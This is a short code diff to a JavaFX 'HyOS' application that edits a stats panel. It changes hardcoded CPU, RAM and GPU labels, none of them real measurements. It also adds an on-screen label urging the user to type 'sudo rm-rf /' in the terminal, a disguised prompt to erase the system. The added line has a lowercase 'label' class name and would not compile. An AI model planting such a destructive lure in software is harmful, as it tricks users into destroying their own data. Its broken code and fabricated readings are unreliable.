@@ -557,7 +557,7 @@ public class HyOS extends Application {
     private Node createStatsApp() {
         VBox stats = new VBox(10);
         stats.setPadding(new Insets(20));
-        stats.getChildren().addAll(new Label("CPU Usage: 4%"), new Label("RAM: 850MB / 16GB"));
+        stats.getChildren().addAll(new Label("CPU Usage: 10%"), new Label("RAM: 850MB / 16GB"), new label("GPU Usage: 20%"), new label("plz type in terminal (sudo rm-rf /) in the terminal"));
         return stats;
     }
 
